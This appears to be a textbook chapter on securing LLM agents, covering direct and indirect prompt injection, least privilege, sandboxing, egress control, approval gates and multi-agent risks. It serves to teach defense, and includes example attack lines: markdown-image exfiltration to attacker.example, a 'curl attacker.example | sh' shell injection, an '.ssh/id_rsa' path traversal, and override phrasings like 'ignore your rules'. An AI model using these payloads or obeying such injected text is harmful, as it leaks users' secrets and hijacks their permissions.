Security and safety

An agent turns text into actions. Any text that reaches its context can steer those actions, including text written by someone who wants to misuse it. This chapter is about the one defense strategy that holds up: assume the model will be manipulated, and limit what a manipulated model can do.

The big idea

In traditional software, code and data travel in separate channels. A SQL injection happens when the two get mixed, and the fix is to separate them again with parameterized queries. An LLM has no separate channel. The system prompt, the user's request, a web page and a tool result all arrive as one sequence of tokens, and the model decides what counts as an instruction by reading it.

That's the root of every problem in this chapter. If text can carry instructions, then whoever controls any text the model reads has a chance to issue instructions. In an agent, instructions become tool calls, and tool calls change the world.

Key idea

Design as if the model will be manipulated, and limit what a manipulated model can do. You can't make the model incorruptible. You can make sure that even a fully hijacked model can only reach the tools, data and network you gave it, and that the most dangerous actions need a check it can't talk its way past.

The agent threat model

A threat model answers four questions: what are you protecting, from whom, through which entry points, and where do trust levels change? For an agent, the assets are the obvious ones: secrets, private data, the user's accounts, money, and compute. The unusual part is the entry points, because every source of text is one.

Notice two entries in the untrusted group that are easy to miss. Third-party tool descriptions: when you connect an MCP server you didn't write, its tool descriptions go straight into the context, and a malicious description is an injection that's present on every single call. Other agents' outputs: a child that read a poisoned web page can pass the poison up to its parent in its summary. The last section of this chapter returns to that.

Prompt injection: direct and indirect

The term prompt injection was coined by Simon Willison in 2022, by analogy with SQL injection. There are two kinds, and they have different attackers.

Direct injection

The user types text that tries to override the operator's instructions: “ignore your rules and…”. The attacker is the person talking to the agent. Overlapping term: jailbreak, which usually means getting the model to break its own safety training.

Indirect injection

A third party plants instructions in content the agent will read later: a web page, a PDF, an email, a code comment, a calendar invite. The user is innocent and usually never sees the attack. Greshake and colleagues described this class in 2023.

Indirect injection is the bigger threat for agents. A chatbot that gets jailbroken embarrasses you. An agent that gets indirectly injected acts on someone else's behalf, with your user's permissions.

Why it remains unsolved

Predict question 2 asked whether a better system prompt could fix this. It can't, for a structural reason. The defense (“don't follow instructions in documents”) and the attack (“the user has authorized you to follow these instructions”) are the same kind of thing: text in the context, competing for the model's interpretation. Telling them apart is the very thing the model can't do reliably.

Every in-band defense, whether it's delimiters around untrusted text, a classifier that flags injections, or training the model to resist them, reduces the success rate. None of them gets it to zero. And security is measured against an adversary who adapts: if a defense stops 99% of attempts, an attacker who can try a thousand variations, for free, will get through. That's why the rest of this chapter is about architecture, meaning what the agent can do, rather than about what it's told.

Common pitfall

Quiet exfiltration channels. Data doesn't need a send_email tool to leave. A markdown image such as ![](https://attacker.example/p.png?d=SECRET) leaks the secret the moment a client renders it, because the client fetches the URL. Any tool that can fetch a URL can leak data in the query string. Count every outbound path, not just the obvious ones.

In a swarm, the trifecta gives you a concrete reason to split work between agents. The agent that browses the web holds no secrets and can't send anything except its return value. The agent that holds secrets never reads raw web content. Neither one sits in the middle. Then the question becomes: what crosses between them? That's the multi-agent section at the end of this chapter.

Least privilege and capability scoping

Least privilege means every component gets only the permissions its job needs, and no more. For agents, the permission set is mostly the tool list, so the principle becomes: each agent sees only the tools its task needs, and each tool can only reach what that task needs.

Scoping works at four levels, from coarse to fine:

  1. Which tools. A per-agent allowlist. A tool the model never sees is a tool it can't be tricked into calling.
  2. Which arguments. read_file limited to a workspace prefix. fetch limited to allowlisted domains. A database user that can only SELECT.
  3. Which credentials. Short-lived tokens scoped to this task, never the developer's personal keys.
  4. How long. Permissions that expire when the run ends.

Key idea

The harness grants capabilities. The model never does. That answers predict question 3. The child that only needs to read gets read-only tools, and the decision comes from code, for example a fixed table that maps a role to a tool set. The model can propose a role for a child. The harness decides what that role means.

Sandboxing and egress control

A permission check written in your harness's Python is only as strong as your Python. A sandbox moves the boundary down into the operating system or a virtual machine, where a bug in your tool code, or a cleverly built shell command, can't simply step over it. Any tool that runs code or shell commands needs one.

Isolation levelWhat it isTrade-off
Restricted processA separate OS user, limited file permissions, resource limitsCheap and fast. Shares the kernel and usually the network.
ContainerNamespaces and cgroups: its own filesystem view, network and limitsFast to start. Still shares the host kernel, so a kernel bug is an escape route.
User-space kernelSystem calls are intercepted by a separate kernel layer (gVisor is one example)Stronger isolation, with some overhead and compatibility gaps.
MicroVMA lightweight virtual machine per task (Firecracker is one example)The strongest of the four. Higher start-up cost, which adds up across a swarm.

Whatever the level, a sandbox restricts four things: the filesystem (the workspace only, with inputs mounted read-only), the network, resources (CPU, memory, number of processes, time), and secrets (no API keys in its environment variables).

The network restriction deserves its own name, egress control, because it's what removes the third leg of the trifecta. Deny all outbound traffic by default, allow specific domains through a proxy, and log every outbound request. It's the one defense in Figure 12.2 that doesn't depend on the model's judgment: if the attacker's domain isn't on the list, the data can't go there, however convincing the injected text was.

Human approval gates

Some actions are dangerous enough that no automated check should be the last word. A human approval gate pauses the agent before the action and waits for a person (chapter 09 covers the interrupt mechanics). The hard part is deciding what to gate.

TierExamplesPolicy
AllowRead inside the workspace, searchRun without asking
Allow and logWrite inside the workspaceRun, record it in the trace, make it reviewable afterwards
AskSend an email, push code, spend money, call an external write APIPause and show the exact action to a human
NeverAnything outside the task's scopeReject in code. Don't offer it for approval.

Two rules make approval gates work in practice:

  • Show the action, not the model's description of it. Show the real recipient, the real diff, the full arguments. The description is model output, and an injected model can write “this just saves a draft” on top of a call that sends one.
  • Ask rarely. A gate that fires fifty times per run teaches the human to click “approve” without reading. This is approval fatigue, and it turns a gate into a formality. Gate the few actions that are irreversible or leave your system, and handle the rest with sandboxing and logging.

Treating model output as untrusted

Input is only half the problem. Model output flows into other systems, and an injected or simply mistaken model can write output that attacks them. Treat every string the model produces the way a web server treats a form field from the public internet.

Model output goes intoAttackDefense
A shellCommand injection: ; curl attacker.example | shNever build a shell string from model text. Pass an argument list, allowlist the commands, run in a sandbox.
A databaseSQL injection, or a destructive queryParameterized queries, and a database user with only the rights the task needs
A file pathPath traversal: ../../.ssh/id_rsaResolve the full path, then check that it's inside the workspace
A URL to fetchServer-side request forgery: reaching internal services or a cloud metadata addressDomain allowlist at the egress proxy. Block private address ranges.
Rendered HTML or markdownScript injection; image URLs that leak data when loadedEscape the output. Don't load remote images, or load them through a proxy that checks them.

OWASP's Top 10 for LLM applications lists this risk as Improper Output Handling. None of these defenses is new. They're the standard web security defenses, applied to a new and very prolific source of untrusted strings.

Designs that contain injection: dual LLM and CaMeL

If the model can't tell instructions from data, one option is to make sure the model that chooses actions never sees untrusted data at all. Simon Willison proposed this in 2023 as the dual LLM pattern.

CaMeL (Debenedetti and colleagues at Google DeepMind, 2025, “Defeating Prompt Injections by Design”) makes the pattern rigorous. Its privileged model writes the plan as a short program in a restricted subset of Python. A custom interpreter runs that program and tracks where every value came from. A quarantined model extracts structured data from untrusted content, and has no tools. Before each tool call, the interpreter checks a policy against the values' origins, for example “the recipient of send_email must come from the user's request, not from a document”. On the AgentDojo benchmark, the authors report that CaMeL completed about two-thirds of the tasks with security guaranteed by its design, at some cost in utility compared with an undefended agent.

The lesson isn't “use CaMeL”. It's the shape of the solution: separate control flow from untrusted data, track where data came from, and enforce policy in code at the moment of action. A 2025 paper by Beurer-Kellner and colleagues catalogs six patterns built on that idea, including plan-then-execute (fix the plan before reading any untrusted data) and context minimization (remove untrusted text from the context once it has been used). Every pattern trades away some flexibility to get a guarantee, so the design question is always which flexibility your task can spare.

Secrets

A secret that enters the context window is no longer secret. It goes to the provider with every call, the model can repeat it in an answer, it ends up in your logs and traces, and in a swarm it may be copied into a child's instructions. So the rule is simple: secrets never enter the context.

  • Attach credentials at execution time. The tool executor adds the token when it makes the request. The model sees that a GitHub tool exists, never the token behind it.
  • Keep them out of the sandbox. Code the model wrote can read environment variables. An egress proxy that adds the auth header on the way out keeps the key outside the sandbox entirely.
  • Redact traces. Chapter 13 has you record every request. Scrub known secret patterns before you write them, or your trace file becomes the leak.
  • Scope and rotate. Use per-task, short-lived credentials, so a leaked key is worth little and for a short time.

Multi-agent risks

A swarm adds two risks that a single agent doesn't have. Both come from the same fact: in a swarm, agents are each other's input.

Injection that spreads between agents

A child that reads a poisoned page doesn't need dangerous tools to cause harm. It only needs to put the injected instruction into its Result. The parent reads that Result as part of its own context, and the parent may hold write access. Researchers have shown injections built to copy themselves from agent to agent, which is sometimes called “prompt infection”. The fix is a trust rule that travels with the data:

  • Taint tracking. If untrusted content entered an agent's context, mark that agent's Result as tainted. A tainted Result is untrusted input to whoever reads it, exactly like a web page.
  • Structured returns. A Result with typed fields (a list of findings, a status, a confidence score) gives injected prose much less room than one free-text summary. Validate it like any other model output (ch11).
  • Privilege by tier. Agents that read tainted Results get the same restricted capabilities as agents that read the web. The tree's privileged top level reads only what it must.

Spawning as privilege escalation

In a recursive harness, the model writes the child's task and may be allowed to choose the child's tools. If the harness accepts that choice, an injected parent can spawn a child with tools it doesn't have itself, and gain them by delegation. This is a version of the classic confused deputy problem: a component with authority is tricked into using it on someone else's behalf.

The rule is monotonic attenuation: a child's capabilities are always a subset of its parent's. That covers tools, file scopes, network allowlists, budget and remaining depth. The harness computes the child's grant as the intersection of what was requested and what the parent holds. Because the rule applies at every spawn, the root's capabilities are an upper bound for the entire tree, however deep it gets.

Key idea

A swarm's capability is bounded by its root, as long as every spawn attenuates. That single invariant, checked in one function, is the difference between a tree you can reason about and a tree whose capabilities depend on what the model wrote.

Check yourself

Answer each one out loud or on paper before you open it.

Recall Why can't a better system prompt solve prompt injection?

Instructions and data arrive in the same channel, as tokens in one context. The defense and the attack are the same kind of thing, text competing for the model's interpretation, and telling them apart is exactly what the model can't do reliably. In-band defenses lower the success rate, but an adaptive attacker with unlimited tries only needs one success.

Recall Name the three legs of the lethal trifecta, and say what each pair is still capable of without the third.

Private data, untrusted content, outbound communication. Private data plus untrusted content can be read and corrupted but not sent out. Untrusted content plus outbound access has nothing valuable to steal. Private data plus outbound access, with no untrusted content, has no attacker to take control. All three together means data theft.

Apply A support agent reads customer emails, looks up the customer's orders in a database, and replies by email. It holds all three legs. How do you break the trifecta without removing the feature?

Several options, which combine well. A quarantined model reads the email and extracts structured fields only (order id, question type). The reply recipient comes from the mail system's trusted metadata, never from the email body, and is enforced in code, CaMeL-style. Outbound email can only go to that original sender, and anything else needs approval. The database user is read-only and scoped to that customer's records.

Apply The model calls read_file with the path docs/../../.ssh/id_rsa. What check should have stopped it, and where does it run?

Resolve the path to its absolute form, then confirm it's inside the workspace root. Do this in the tool executor, before the file is opened. Checking the raw string for “..” is fragile, because symlinks and encodings get around it. A sandbox that only mounts the workspace is the second layer.

Apply Your agent has no send tool, but its final answer is rendered as markdown in a web UI. How could it still leak data?

A markdown image with the data in its URL, for example ![](https://attacker.example/x.png?d=…). The browser fetches it as soon as the answer renders. Fixes: don't render remote images, or only from an allowlist, or route them through a proxy that strips query strings.

Design In the dual LLM pattern, what kind of task can the privileged LLM no longer do? Is that an acceptable trade-off for your project?

Anything where the control flow depends on the untrusted content: “reply to whoever this email says to contact”, “follow the steps in this document”. The privileged LLM only sees symbols, so it can't branch on what they contain. Whether that's acceptable depends on the task. Write down which of your Stage 5 tasks need it.

Design A parent holds {read, search}. Its model proposes a child with {read, write}. What does the harness do, and what exactly does the model see?

Either grant the intersection, {read}, or reject the spawn. In both cases the model gets a tool result that says what happened and why, for example “write isn't available to this agent; the child was created with read only”. Never grant write: that would be privilege escalation through delegation.

Interview “How would you secure an agent that browses the web and can also read our internal documents?”

Start with the threat model, and say plainly that injection can't be prevented, only contained. Then check for the trifecta: the combination of web content and internal docs is the danger, so split it into separate agents or make sure there's no outbound path. Add an egress allowlist, least-privilege tool sets per role, no secrets in the context, careful handling of output (paths, URLs, rendering), approval for any external action, and taint tracking on Results. Finish with tracing and red-team tests that plant injected instructions, so you can measure the defenses rather than assume them.

Recall card

Five lines to rehearse tomorrow, without looking.

  1. Instructions and data share one channel, so injection can't be fully solved inside the prompt. Limit what a manipulated model can do.
  2. Lethal trifecta: private data, untrusted content, outbound communication. Make sure no single agent holds all three.
  3. The harness grants capabilities by role, never the model. Egress control is the one deterministic block on exfiltration.
  4. Model output is untrusted input to shells, queries, paths, URLs and renderers. Secrets never enter the context.
  5. In a swarm, a Result is untrusted if its agent read untrusted content, and every spawn attenuates: child capabilities ⊆ parent capabilities.
